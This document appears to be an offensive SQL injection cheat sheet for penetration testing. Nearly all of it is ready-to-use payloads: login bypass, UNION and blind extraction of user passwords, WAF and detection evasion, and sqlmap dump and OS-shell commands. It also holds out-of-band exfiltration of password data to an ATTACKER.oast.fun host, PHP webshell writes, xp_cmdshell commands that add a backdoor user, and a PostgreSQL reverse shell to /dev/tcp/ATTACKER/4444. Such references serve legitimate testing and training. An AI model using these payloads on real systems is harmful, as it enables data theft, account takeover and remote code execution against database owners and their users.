# SQL Injection (SQLi)

SQL Injection is ranked #3 in OWASP Top 10 (A03:2021-Injection). This reference covers manual and automated exploitation techniques for all major database engines.

---

## Quick Reference Test Payloads

```sql
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin'#
```

---

## Database Fingerprinting

| Database | Version Query | Comment Style |
|----------|---------------|---------------|
| **MySQL** | `SELECT VERSION()` or `@@version` | `#` or `-- ` |
| **MSSQL** | `SELECT @@VERSION` | `--` |
| **PostgreSQL** | `SELECT VERSION()` | `--` |
| **Oracle** | `SELECT BANNER FROM v$version` | `--` |
| **SQLite** | `SELECT sqlite_version()` | `--` |

### Database-Specific Functions

```sql
-- MySQL
SELECT USER()
SELECT DATABASE()
SELECT SCHEMA()

-- MSSQL
SELECT SYSTEM_USER
SELECT DB_NAME()
SELECT HOST_NAME()

-- PostgreSQL
SELECT CURRENT_USER
SELECT CURRENT_DATABASE()
```

---

## Injection Techniques

### 1. Error-Based SQLi

```sql
-- MySQL version enumeration
' or 1=1 in (select @@version) -- //

-- Force errors for data extraction
' OR 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CAST((SELECT @@version) AS int)--

-- MySQL EXTRACTVALUE
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND (SELECT COUNT(*) FROM information_schema.tables GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--
```

### 2. Union-Based SQLi

```sql
-- Determine column count
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 5-- //

-- Find displayable columns
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //

-- Extract database info
%' UNION SELECT database(), user(), @@version, null, null -- //

-- Enumerate tables and columns
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

-- Extract user data
' UNION SELECT null, username, password, description, null FROM users -- //
```

### 3. Boolean-Based Blind SQLi

```sql
-- Basic tests
' AND 1=1-- //  (True response)
' AND 1=2-- //  (False response)

-- Character-by-character extraction
' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>65--
```

### 4. Time-Based Blind SQLi

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(3),'false') -- //

-- MSSQL
'; WAITFOR DELAY '00:00:05'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

---

## Authentication Bypass

### Login Bypass Payloads

```sql
admin'--
admin'#
admin'/*
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
' OR 1=1#
') OR '1'='1'--
') OR ('1'='1'--
```

### Advanced Bypass Techniques

```sql
-- Case variation
AdMiN'--
' oR '1'='1

-- URL encoding
%27%20OR%20%271%27%3D%271
' OR CHAR(49)=CHAR(49)--

-- Whitespace bypass
'/**/OR/**/1=1--
'+OR+1=1--
'%0aOR%0a1=1--
```

---

## Database Enumeration

### MySQL Information Schema

```sql
-- List databases
SELECT SCHEMA_NAME FROM information_schema.SCHEMATA

-- List tables
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='database_name'

-- List columns
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='table_name'
```

### MSSQL System Tables

```sql
-- List databases
SELECT name FROM sys.databases

-- List tables
SELECT name FROM sys.tables

-- List columns
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('table_name')
```

### PostgreSQL

```sql
-- List databases
SELECT datname FROM pg_database;

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';
```

### Oracle

```sql
-- Get version
SELECT BANNER FROM v$version;

-- List tables
SELECT table_name FROM user_tables;
SELECT table_name FROM all_tables;

-- List columns
SELECT column_name FROM user_tab_columns WHERE table_name='TABLE_NAME';

-- List schemas
SELECT username FROM all_users;
```

---

## Database Connection & Enumeration

### MySQL

```bash
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
```

```sql
SELECT VERSION();
SELECT SYSTEM_USER();
SHOW DATABASES;
USE database_name;
SHOW TABLES;
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='database_name';
DESCRIBE table_name;
SELECT user, authentication_string FROM mysql.user WHERE user = 'username';
```

### MSSQL

```bash
impacket-mssqlclient Administrator:Password@192.168.50.18 -windows-auth
sqlcmd -S 192.168.50.18 -U Administrator -P Password
```

```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT DB_NAME();
SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
SELECT * FROM database_name.dbo.table_name;
```

---

## Out-of-Band (OOB) SQLi

When the injection is fully blind and time-based is too slow/unreliable, exfiltrate via DNS/HTTP to a collaborator. This is the fastest blind technique when egress is allowed.

```sql
-- MSSQL: DNS exfil via UNC path
'; declare @q varchar(1024); set @q='\\'+(SELECT TOP 1 password FROM users)+'.ATTACKER.oast.fun\x'; exec master..xp_dirtree @q;--
EXEC master..xp_fileexist '\\'+(SELECT @@version)+'.ATTACKER.oast.fun\x';

-- Oracle: many OOB primitives
SELECT UTL_INADDR.get_host_address((SELECT user FROM dual)||'.ATTACKER.oast.fun') FROM dual;
SELECT UTL_HTTP.request('http://ATTACKER.oast.fun/'||(SELECT password FROM users WHERE rownum=1)) FROM dual;
SELECT DBMS_LDAP.init((SELECT user FROM dual)||'.ATTACKER.oast.fun',80) FROM dual;
-- XXE-based OOB (Oracle 11g+)
SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://'||(SELECT user FROM dual)||'.ATTACKER.oast.fun/">%p;]>'),'/l') FROM dual;

-- MySQL (Windows, secure_file_priv permitting): UNC LOAD_FILE
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.ATTACKER.oast.fun\\x'));

-- PostgreSQL: COPY ... TO PROGRAM (superuser) or dblink
COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).ATTACKER.oast.fun';
SELECT dblink_connect('host=ATTACKER user=x password='||(SELECT passwd FROM pg_shadow LIMIT 1)||' dbname=x');
```

---

## Automated Tools - SQLMap

```bash
# Basic scan
sqlmap -u "http://TARGET/page.php?id=1"

# POST data
sqlmap -u "http://TARGET/login.php" --data="username=admin&password=pass"

# Cookie-based
sqlmap -u "http://TARGET/page.php" --cookie="PHPSESSID=abc123"

# Use a saved Burp request (best — captures headers/cookies/body)
sqlmap -r request.txt --batch

# Target a specific param, set DBMS, raise level/risk for deeper tests
sqlmap -r request.txt -p id --dbms=mysql --level=5 --risk=3

# JSON / nested body — mark the inject point with *
sqlmap -u "http://TARGET/api" --data='{"id":"1*"}' --headers="Content-Type: application/json"

# Dump specific database
sqlmap -u "http://TARGET/page.php?id=1" -D database_name --dump

# Dump all / enumerate
sqlmap -u "http://TARGET/page.php?id=1" --dump-all
sqlmap -u "http://TARGET/page.php?id=1" --dbs --tables --columns --current-user --is-dba

# OS shell / SQL shell / file ops
sqlmap -u "http://TARGET/page.php?id=1" --os-shell
sqlmap -u "http://TARGET/page.php?id=1" --sql-shell
sqlmap -u "http://TARGET/page.php?id=1" --file-read=/etc/passwd
sqlmap -u "http://TARGET/page.php?id=1" --file-write=shell.php --file-dest=/var/www/html/s.php

# Speed up blind extraction
sqlmap -r request.txt --technique=BEUST --threads=10 --no-cast --hex

# OOB exfil
sqlmap -r request.txt --dns-domain=ATTACKER.oast.fun     # DNS exfil channel

# WAF bypass — chain tamper scripts
sqlmap -u "http://TARGET/?id=1" --tamper=space2comment,between,randomcase,charencode --random-agent
sqlmap -u "http://TARGET/?id=1" --tamper=space2comment --proxy=http://127.0.0.1:8080
```

### Useful tamper scripts

```text
space2comment, space2hash, space2mysqlblank, modsecurityversioned, modsecurityzeroversioned,
between, randomcase, charencode, charunicodeencode, equaltolike, greatest, percentage,
apostrophemask, base64encode, versionedmorekeywords, multiplespaces, unionalltounion
```

---

## Manual Testing Workflow

```bash
# 1. Detect injection point
curl "http://TARGET/page.php?id=1'"

# 2. Determine column count
curl "http://TARGET/page.php?id=1' ORDER BY 5--"

# 3. Find injectable columns
curl "http://TARGET/page.php?id=1' UNION SELECT 1,2,3,4,5--"

# 4. Extract data
curl "http://TARGET/page.php?id=1' UNION SELECT 1,username,password,4,5 FROM users--"
```

---

## WAF Bypass Techniques

```sql
-- Comment variations
/*! UNION */ SELECT
/*!50000 UNION */ SELECT

-- Case mixing
UnIoN SeLeCt

-- Double encoding
%2527%2520OR%2520%2527%2531%2527%253D%2527%2531

-- Inline comments
SELECT/*comment*/username/*comment*/FROM/*comment*/users

-- Alternative operators
' OR 'x'='x
' OR 'x'LIKE'x
' OR 1 LIKE 1
```

---

## Detection Evasion - Encoding Methods

```sql
-- URL encoding
%27 = '
%20 = space
%2D%2D = --

-- Hex encoding
SELECT 0x61646D696E  -- 'admin'

-- Char function
SELECT CHAR(97,100,109,105,110)  -- 'admin'

-- Unicode encoding
%u0027%u0020OR%u00201%u003d1--

-- Random time delays for stealth
' AND IF(1=1,SLEEP(FLOOR(RAND()*5)),0)--
```

---

## Post-Exploitation

### File Operations (MySQL)

```sql
-- Read files (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd')
' UNION SELECT LOAD_FILE('/etc/passwd'),null,null,null,null -- //

-- Write files
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php'
```

### Command Execution (MSSQL)

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Execute commands
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker password123 /add'
```

### Privilege Escalation

```sql
-- MySQL: check current privileges
SELECT * FROM mysql.user WHERE user = USER()

-- MSSQL: check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')

-- MSSQL: add user to sysadmin role
EXEC sp_addsrvrolemember 'username', 'sysadmin'
```

---

## Advanced Techniques

### Second-Order SQLi

```sql
-- Register user with malicious payload
username: admin'--
-- Payload executes when username is used in another query
```

### NoSQL Injection (MongoDB)

```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// JavaScript injection
{"username": "admin", "password": {"$where": "return true"}}
```

---

## Common Vulnerable Code Patterns (PHP)

```php
// Vulnerable concatenation
$sql = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

// Vulnerable LIKE query
$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";

// Vulnerable GET parameter
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

---

## Testing Methodology

### 1. Discovery Phase

```
Test special characters: ' " ; \ / * % _ [ ] ( ) & | ` ~ ! @ # $ ^ - + = { } < >
```

### 2. Fingerprinting Phase

```sql
' AND 1=1--  (MySQL, MSSQL, PostgreSQL)
' AND 1=1#   (MySQL only)
' AND 1=1/*  (MySQL, MSSQL)
' UNION SELECT @@version--  (MySQL, MSSQL)
' UNION SELECT version()--  (PostgreSQL)
```

### 3. Exploitation Phase Priority

1. Database version and type
2. Current user and privileges
3. Database names
4. Table names
5. Column names
6. Sensitive data (users, passwords, etc.)

---

## Advanced WAF Bypass (Modern)

```sql
-- MySQL scientific-notation / no-space union (beats many regex WAFs)
1.e(union)select(1)
0e1union(select(1),version())
-- No-comma UNION (when ',' is filtered) via JOIN
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- -
-- No-quotes string via hex / char
' UNION SELECT 0x61646d696e-- -        -- 'admin'
' UNION SELECT username FROM users WHERE id=0x31-- -
-- Keyword-split with inline comments / versioned comments
UN/**/ION SE/**/LECT     /*!50000UNION*//*!50000SELECT*/
-- Logical-operator alternatives when AND/OR blocked
' && '1'='1        ' || '1'='1        ' ^ '1'='1'      ' XOR true-- -
-- Whitespace alternatives
%09 %0a %0b %0c %0d %a0 /**/ ()  +  (e.g. SELECT()FROM)
-- Bypass = filter
' OR 1 LIKE 1-- -    ' OR 1 BETWEEN 1 AND 1-- -   ' OR id IN(1)-- -
-- Double URL-encode + mixed case for ModSecurity CRS
%2553ELECT  uNiOn  /*!UnIoN*/
-- HPP (HTTP Parameter Pollution) to split the payload across dupes
?id=1/*&id=*/UNION/*&id=*/SELECT...
```

---

## Database-Specific RCE Quick Reference

```sql
-- MySQL: write webshell (needs FILE priv + secure_file_priv='' + known web path)
' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/s.php'-- -
-- MySQL UDF (sys_exec) if lib_mysqludf_sys present
SELECT sys_exec('id');
-- MSSQL: xp_cmdshell (see Command Execution above) / OLE automation / sp_OACreate
-- PostgreSQL: COPY ... FROM PROGRAM (superuser) -> RCE
COPY t FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';
CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;
-- Oracle: DBMS_SCHEDULER / java stored procs for command execution
```

---

## References

- PortSwigger — SQL injection: https://portswigger.net/web-security/sql-injection
- PortSwigger — SQLi cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- PayloadsAllTheThings — SQL Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/
- HackTricks — SQL injection: https://hacktricks.wiki/en/pentesting-web/sql-injection/index.html
- sqlmap: https://github.com/sqlmapproject/sqlmap | tamper scripts: https://github.com/sqlmapproject/sqlmap/tree/master/tamper
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
